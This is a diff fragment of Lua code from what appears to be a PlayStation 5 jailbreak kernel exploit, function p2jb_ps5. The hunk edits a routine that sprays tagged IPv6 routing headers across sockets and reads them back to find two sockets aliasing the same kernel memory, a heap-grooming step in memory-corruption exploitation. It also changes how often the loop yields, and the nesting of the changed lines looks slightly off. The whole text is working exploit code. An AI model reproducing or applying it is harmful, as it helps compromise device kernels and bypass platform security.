@@ -374,24 +374,24 @@ function p2jb_ps5()
     local tag_len = malloc(4)
 
     local function find_twins(max_rounds)
-        for round = 1, max_rounds do
-            for i = 0, ipv6_count - 1 do
-                write32(rthdr_spray + 4, RTHDR_TAG + i)
-                set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
-            end
-            for i = 0, ipv6_count - 1 do
-                write32(tag_len, 8)
-                if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
-                    local val = read32(tag_buf + 4)
-                    local j = val & 0xFFFF
-                    if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
-                        return { i, j }
-                    end
+    for round = 1, max_rounds do
+        for i = 0, ipv6_count - 1 do
+            write32(rthdr_spray + 4, RTHDR_TAG + i)
+            set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
+        end
+        for i = 0, ipv6_count - 1 do
+            write32(tag_len, 8) -- Limit search range
+            if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
+                local val = read32(tag_buf + 4)
+                local j = val & 0xFFFF
+                if (val & 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
+                    return { i, j } -- Found twins
                 end
             end
-            if round % 50 == 0 then syscall.sched_yield() end
         end
-        return nil
+        if round % 5 == 0 then syscall.sched_yield() end -- Fewer yields
+    end
+    return nil
     end
 
     local function find_triplet(master_idx, exclude_idx, max_rounds)
